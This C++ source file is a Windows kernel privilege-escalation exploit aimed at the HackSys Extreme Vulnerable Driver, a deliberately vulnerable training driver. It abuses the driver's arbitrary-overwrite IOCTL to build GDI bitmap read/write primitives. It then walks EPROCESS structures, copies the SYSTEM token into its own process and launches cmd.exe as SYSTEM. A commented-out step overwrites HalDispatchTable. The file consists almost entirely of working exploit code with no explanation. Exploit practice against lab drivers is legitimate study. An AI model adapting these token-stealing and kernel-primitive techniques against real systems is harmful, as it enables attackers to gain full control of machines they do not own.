#include <iostream>
#include <Windows.h>
#include <Psapi.h>
using namespace std;

extern "C" void Int_3();
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
HBITMAP hManager = NULL;
HBITMAP hWorker = NULL;
DWORD64 ActiveProcessLinksOffset = 0x188; //0x2F0;
DWORD64 TokenOffset = 0x208; //0x358;
DWORD64 UniqueProcessIdOffset = 0x180; //0x2E8;
DWORD64 GdiSharedHandleTableOffset = 0xF8;

typedef struct _WRITE_WHATE_WHERE {
	INT_PTR What;
	INT_PTR Where;
}WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

typedef struct _GDICELL64 {
	PVOID64 pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	PVOID64 pUserAddress;
}GDICELL64;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	PVOID  Unknown1;
	PVOID  Unknown2;
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG   Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID                   SystemInformation,
	IN ULONG                    SystemInformationLength,
	OUT PULONG                  ReturnLength);

DWORD64 GetGdiSharedHandle() {
	const DWORD64 Teb = reinterpret_cast<DWORD64>(NtCurrentTeb());
	DWORD64 Peb = *(DWORD64*)((PUCHAR)Teb + 0x60);
	cout << "[+] TEB : " << hex << Teb << endl;
	cout << "[+] PEB : " << hex << Peb << endl;

	DWORD64 Gdi = *(DWORD64*)((PUCHAR)Peb + 0xf8);
	return Gdi;
}

DWORD64 GetkernelAddress(HBITMAP hBitmap) {
	WORD arr = LOWORD(hBitmap);
	DWORD64 cell = *(DWORD64*)(GetGdiSharedHandle() + LOWORD(hBitmap) * 0x18);
	return cell;
}

VOID ReadVirtaulMemory(DWORD64 Address, BYTE* value, DWORD64 len) {
	DWORD64 writebuf = Address;
	SetBitmapBits(hManager, sizeof(DWORD64), &writebuf);
	GetBitmapBits(hWorker, len, value);
}

VOID WriteVirtualMemory(DWORD64 Address, DWORD64 Value) {
	DWORD64 writebuf = Address;
	SetBitmapBits(hManager, sizeof(DWORD64), &writebuf);

	SetBitmapBits(hWorker, sizeof(DWORD64), &Value);
}

// Get base of ntoskrnl.exe
ULONG64 GetNTOsBase()
{
	ULONG64 Bases[0x1000];
	DWORD needed = 0;
	ULONG64 krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID*)& Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

// Get EPROCESS for System process
DWORD64 PsInitialSystemProcess()
{
	// load ntoskrnl.exe
	DWORD64 ntos = (DWORD64)LoadLibrary("ntoskrnl.exe");
	// get address of exported PsInitialSystemProcess variable
	DWORD64 addr = (DWORD64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	DWORD64 res = 0;
	DWORD64 ntOsBase = GetNTOsBase();
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (ntOsBase) {
		ReadVirtaulMemory(addr - ntos + ntOsBase, (BYTE *)&res, sizeof(DWORD64));
	}
	return res;
}

// Get EPROCESS for current process
DWORD64 PsGetCurrentProcess()
{
	DWORD64 pEPROCESS = PsInitialSystemProcess();// get System EPROCESS

	// walk ActiveProcessLinks until we find our Pid
	LIST_ENTRY ActiveProcessLinks;
	ReadVirtaulMemory(pEPROCESS + UniqueProcessIdOffset + sizeof(DWORD64), (BYTE *)&ActiveProcessLinks, sizeof(LIST_ENTRY));
	
	DWORD64 res = 0;

	while (TRUE) {
		DWORD64 UniqueProcessId = 0;

		// adjust EPROCESS pointer for next entry
		pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - UniqueProcessIdOffset - sizeof(DWORD64);
		// get pid
		ReadVirtaulMemory(pEPROCESS + UniqueProcessIdOffset, (BYTE*)&UniqueProcessId, sizeof(DWORD64));

		// is this our pid?
		if (GetCurrentProcessId() == UniqueProcessId) {
			res = pEPROCESS;
			break;
		}
		// get next entry
		ReadVirtaulMemory(pEPROCESS + UniqueProcessIdOffset + sizeof(DWORD64), (BYTE*)& ActiveProcessLinks, sizeof(LIST_ENTRY));
		
		// if next same as last, we reached the end
		if (pEPROCESS == (DWORD64)(ActiveProcessLinks.Flink) - UniqueProcessIdOffset - sizeof(DWORD64))
			break;
	}
	return res;
}

PVOID HalDispatchTable() {
	HMODULE hNtDll = NULL;
	SIZE_T ReturnLength;

	hNtDll = LoadLibrary("ntdll.dll");
	if (!hNtDll) {
		std::cout << "[-] Failed to load ntdll.dll\n";
		return NULL;
	}

	NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)
		GetProcAddress(hNtDll, "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		std::cout << "[+] GetProcAddress Failed.\n";
		return NULL;
	}

	std::cout << "[+] Resolved NtQuerySystemInformation at address " << std::hex << NtQuerySystemInformation << std::endl;

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, (PULONG)& ReturnLength);
	std::cout << "[+] First NtQuerySystemInformation passed.\n";

	PSYSTEM_MODULE_INFORMATION pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)
		HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength);
	if (pSystemModuleInformation == NULL) {
		std::cout << "[-] SystemModuleInformation HeapAlloc Failed.\n";
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, pSystemModuleInformation, ReturnLength, (PULONG)& ReturnLength);
	std::cout << "[+] Second NtQuerySystemInformation passed.\n";

	PVOID KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
	PCHAR kernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;

	std::cout << "[+] Loaded Kernel Image " << std::hex << kernelImage << std::endl;
	std::cout << "[+] KernelBaseAddress " << std::hex << KernelBaseAddressInKernelMode << std::endl;

	HMODULE hKernelInUserMode = LoadLibraryA(kernelImage);
	if (hKernelInUserMode == NULL) {
		std::cout << "[-] LoadLibrary Failed.\n";
		return NULL;
	}

	std::cout << "[+] Kernel Base Address is user space is at " << std::hex << hKernelInUserMode << std::endl;

	PVOID HalDispatchTable = GetProcAddress(hKernelInUserMode, "HalDispatchTable");
	if (!HalDispatchTable) {
		std::cout << "[-] Failed to get HalDispatchTable address.\n";
		return NULL;
	}
	else {
		HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable - (ULONG_PTR)hKernelInUserMode);
		HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable + (ULONG_PTR)KernelBaseAddressInKernelMode);
		std::cout << "[+] HalDispatchTable is at address " << std::hex << HalDispatchTable << std::endl;
	}

	HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);
	FreeLibrary(hNtDll);
	FreeLibrary(hKernelInUserMode);

	hNtDll = NULL;
	hKernelInUserMode = NULL;
	pSystemModuleInformation = NULL;

	return HalDispatchTable;
}

VOID TriggerVuln() {
	PVOID HalTable = HalDispatchTable();
	DWORD64 Hal8 = (DWORD64)HalTable + 0x8;
	//PVOID EopPayload = (PVOID)& Int_3;

	INT_PTR write = (INT_PTR)"\x90\x90\x90\x90\x90\x90\x90\x90";
	WriteVirtualMemory(Hal8, write);
	cout << "[+] Written to HalDispatchTable\n";
}

int main(int argc, char* argv[]) {
	BYTE buf[0x64 * 0x64 * 4];
	hManager = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	hWorker = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	if (hManager == NULL || hWorker == NULL) {
		cout << "[-] CreateBitmap Failed.\n";
		exit(-1);
	}

	cout << "[+] Created Manager Bitmap with handle " << hex << hManager << endl;
	cout << "[+] Created Worker Bitmap with handle " << hex << hWorker << endl;

	DWORD64 hManagerKernelAddress = GetkernelAddress(hManager);
	DWORD64 hWorkerKernelAddress = GetkernelAddress(hWorker);
	cout << "[+] Manage Kernel Address " << hex << hManagerKernelAddress << endl;
	cout << "[+] Worker Kernel Address " << hex << hWorkerKernelAddress << endl;

	DWORD64 ManagerPvScan0 = hManagerKernelAddress + 0x50;
	DWORD64 WorkerPvScan0 = hWorkerKernelAddress + 0x50;

	/*WRITE_WHAT_WHERE* payload = reinterpret_cast<WRITE_WHAT_WHERE*>(VirtualAlloc(nullptr, sizeof(WRITE_WHAT_WHERE),
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	if (payload == NULL) {
		cout << "[-] VirtualAlloc Failed.\n";
		exit(-1);
	}

	payload->What = (INT_PTR)&WorkerPvScan0;
	payload->Where = (INT_PTR)&ManagerPvScan0;*/

	BYTE payload[16] = { 0 };
	LPVOID what = VirtualAlloc(nullptr, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(what, (void*)&WorkerPvScan0, sizeof(DWORD64));
	memcpy(payload, &what, 8);
	memcpy(payload + 8, (void*)&ManagerPvScan0, sizeof(DWORD64));

	HANDLE hHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
	if (hHandle == INVALID_HANDLE_VALUE) {
		printf("We were not able to get a handle to the device!\r\n");
		return 1;
	}
	cout << "[+] Opened handle to file with value " << hex << hHandle << endl;
	DWORD bytesReturned = 0x0;
	DeviceIoControl(hHandle, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, &payload, sizeof(payload), nullptr, 0, &bytesReturned, nullptr);
	cout << "[+] Successfully written hWorker at hManager\n";

	DebugBreak();

	//TriggerVuln();

	//DebugBreak();

	// get System EPROCESS
	ULONG64 SystemEPROCESS = PsInitialSystemProcess();
	cout << "[+] System EPROCESS : " << hex << SystemEPROCESS << endl;
	cout << "[+] " << endl << endl;
	DebugBreak();
	ULONG64 CurrentEPROCESS = PsGetCurrentProcess();
	cout << "[+] Current EPROCESS : " << hex << CurrentEPROCESS << endl;
	cout << "[+] " << endl << endl;
	DebugBreak();
	ULONG64 SystemToken = 0;
	// read token from system process
	ReadVirtaulMemory(SystemEPROCESS + TokenOffset, (BYTE*)& SystemToken, sizeof(DWORD64));
	cout << "[+] System Token : " << hex << SystemToken << endl;
	cout << "[+] " << endl << endl;
	DebugBreak();
	
	// write token to current process
	WriteVirtualMemory(CurrentEPROCESS + TokenOffset, (DWORD64)SystemToken);
	DebugBreak();
	
	// Done and done. We're System :)

	system("cmd.exe");
	return 0;
}